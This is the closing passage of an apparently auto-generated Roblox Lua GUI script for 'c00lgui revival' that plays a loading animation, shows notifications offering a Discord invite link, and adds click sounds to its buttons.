task.spawn(C_180);
-- StarterGui.c00lguiSE.Load
local function C_181()
local script = G2L["181"];
	local Players = game:GetService("Players")
	local TweenService = game:GetService("TweenService")
	local SoundService = game:GetService("SoundService")
	
	local BindableFunc = Instance.new("BindableFunction")
	
	local InviteLink = "https://discord.gg/KkhpkGJdCp"
	
	local BindableFunc = function(buttonPressed)
		if buttonPressed == "Yes" then
			if setclipboard then
				setclipboard(InviteLink)
			else
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "c00lgui",
					Text = "Invite Link: https://discord.gg/KkhpkGJdCp",
					Icon = "http://www.roblox.com/asset/?id=117945919346512",
					Duration = 2.5,
				})
			end
		end
	end
	
	local player = Players.LocalPlayer
	
	local gui = Instance.new("ScreenGui")
	gui.IgnoreGuiInset = true
	gui.Parent = player:WaitForChild("PlayerGui")
	
	local minimize = script.Parent.Maximize --whoops, accidentally put in minimize
	
	local targetPosition = UDim2.new(-0, 0, 0.661, 0)
	
	minimize.Position =  UDim2.new(-0, -100, 0.661, 0)
	minimize.Visible = true
	
	local minimizetween = TweenService:Create(
		minimize,
		TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In),
		{Position = targetPosition}
	)
	
	local img = Instance.new("ImageLabel")
	img.Parent = gui
	img.AnchorPoint = Vector2.new(0.5, 0.5)
	img.Position = UDim2.fromScale(0.5, 0.5)
	img.Size = UDim2.fromScale(0, 0)
	img.BackgroundTransparency = 1
	img.Image = "rbxassetid://117945919346512"
	img.ImageTransparency = 0
	
	local popIn = TweenService:Create(
		img,
		TweenInfo.new(
			0.4,
			Enum.EasingStyle.Back,
			Enum.EasingDirection.Out
		),
		{Size = UDim2.fromScale(0.4, 0.8)}
	)
	
	local popOut = TweenService:Create(
		img,
		TweenInfo.new(
			0.3,
			Enum.EasingStyle.Quad,
			Enum.EasingDirection.In
		),
		{
			Size = UDim2.fromScale(0, 0),
			ImageTransparency = 1
		}
	)
	
	local minimizetween = TweenService:Create(
		minimize,
		TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
		{Position = targetPosition}
	)
	
	local sounds = script.Parent.Sounds
	sounds.Sound2:Play()
	
	popIn:Play()
	popIn.Completed:Wait()
	
	wait(1)
	
	sounds.Sound4:Play()
	popOut:Play()
	popOut.Completed:Wait()
	
	wait(0.5)
	
	minimizetween:Play()
	sounds.Sound5:Play()
	
	gui:Destroy()
	
	if script.Parent.TestBuild.Value == false then
	
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "c00lgui",
		Text = "c00lgui revival has loaded.",
		Icon = "http://www.roblox.com/asset/?id=117945919346512",
		Duration = 2.5,
	})
	
	wait(1.5)
	
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "c00lgui",
		Text = "Would you like to join the discord?",
		Icon = "http://www.roblox.com/asset/?id=117945919346512",
		Button1 = "Yes",
		Button2 = "No",
		Callback = BindableFunc
	})
	
	else
	
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "c00lgui",
			Text = "c00lgui revival has loaded.",
			Icon = "http://www.roblox.com/asset/?id=117945919346512",
			Duration = 2.5,
		})
	
		wait(1.5)
	
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "c00lgui",
			Text = "This is a test build, features may change in the final release.",
			Icon = "http://www.roblox.com/asset/?id=117945919346512",
			Duration = 3,
		})
	
	end
	
	wait(5.5)
	startup:Destroy()
	
end;
task.spawn(C_181);
-- StarterGui.c00lguiSE.SoundFeedback
local function C_183()
local script = G2L["183"];
	local screenGui = script.Parent
	local sounds = screenGui.Sounds
	
	local sound1 = sounds:WaitForChild("Sound1")
	local sound2 = sounds:WaitForChild("Sound2")
	local sound3 = sounds:WaitForChild("Sound3")
	local sound4 = sounds:WaitForChild("Sound4")
	
	local function isVisible(button)
		if not button.Visible then return false end
	
		local parent = button.Parent
		while parent and parent:IsA("GuiObject") do
			if not parent.Visible then
				return false
			end
			parent = parent.Parent
		end
	
		return true
	end
	
	local function connectButtonClick(button)
		if button:IsA("TextButton") or button:IsA("ImageButton") then
			button.MouseButton1Click:Connect(function()
				if not isVisible(button) then return end
	
				if button.Name == "Overlay" or button.Name == "MenuOpen" then
					sound1:Play()
					sound3:Play()
				else
					sound1:Play()
				end
			end)
		end
	end
	
	for _, descendant in ipairs(screenGui:GetDescendants()) do
		connectButtonClick(descendant)
	end
	
	screenGui.DescendantAdded:Connect(function(descendant)
		connectButtonClick(descendant)
	end)
	
end;
task.spawn(C_183);

return G2L["1"], require;
